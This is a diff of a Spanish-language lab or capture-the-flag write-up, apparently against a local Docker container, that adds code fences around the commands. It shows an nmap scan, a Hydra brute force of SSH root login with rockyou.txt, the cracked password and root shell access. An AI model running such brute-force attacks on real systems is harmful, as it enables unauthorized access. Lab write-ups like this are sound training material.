@@ -16,9 +16,9 @@ Wordlist: rockyou.txt.gz (ubicado en /usr/share/wordlists/)
 🔎 1) Recon: escaneo completo con Nmap
 
 Comando ejecutado:
-
+```shell
 nmap -sVC -p- -n --min-rate 5000 172.17.0.2
-
+```
 
 Qué hace cada parámetro:
 
@@ -34,6 +34,7 @@ Qué hace cada parámetro:
 
 Salida :
 
+```shell
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-09 00:16 -03
 Nmap scan report for 172.17.0.2
 Host is up (0.0000090s latency).
@@ -48,16 +49,16 @@ MAC Address: 02:42:AC:11:00:02 (Unknown)
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 1.67 seconds
-
+```
 
 Conclusión: SSH abierto en 22/tcp con OpenSSH 7.7 → candidato a fuerza bruta si hay contraseña débil.
 
 🪓 2) Ataque de credenciales: Hydra (usuario único)
 
 Comando ejecutado:
-
+```shell
 hydra -l root -P /usr/share/wordlists/rockyou.txt.gz -t 8 -f -V -o hydra_out.txt ssh://172.17.0.2
-
+```
 
 Qué hace cada parámetro:
 
@@ -70,7 +71,7 @@ Qué hace cada parámetro:
 ssh://IP : objetivo/protocolo.
 
 Evidencia (extracto):
-
+```shell
 dra_out.txt ssh://172.17.0.2
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -190,7 +191,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-09 00:17:
 [STATUS] attack finished for 172.17.0.2 (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-09 00:17:41
-
+```
 
 Credenciales válidas encontradas: root:estrella
 
@@ -199,37 +200,38 @@ Credenciales válidas encontradas: root:estrella
 🔐 3) Acceso por SSH y verificación
 
 Comando ejecutado:
-
+```shell
 ssh root@172.17.0.2
-
+```
 
 Login interactivo (usar la contraseña encontrada). Tras acceder:
-
+```shell
 whoami
 # -> root
-
+```
 Indicadores de contenedor: el prompt muestra algo como root@57d42f3a021f:~# (ID típico de Docker).
 
 📎 Apéndice: Comandos tal cual se ejecutaron (con salidas)
-Nmap
+Nma
+```shell
 nmap -sVC -p- -n --min-rate 5000 172.17.0.2
-
-
+```
 Salida (resumen) ya incluida en la sección 1.
 
 Hydra
+```shell
 hydra -l root -P /usr/share/wordlists/rockyou.txt.gz -t 8 -f -V -o hydra_out.txt ssh://172.17.0.2
-
-
+```
 Extracto clave:
 
 [22][ssh] host: 172.17.0.2   login: root   password: estrella
 
 SSH + verificación
+```shell
 ssh root@172.17.0.2
 whoami
 # root
-
+```
 ✅ Resultado
 
 Servicio identificado: SSH (OpenSSH 7.7) en 172.17.0.2:22
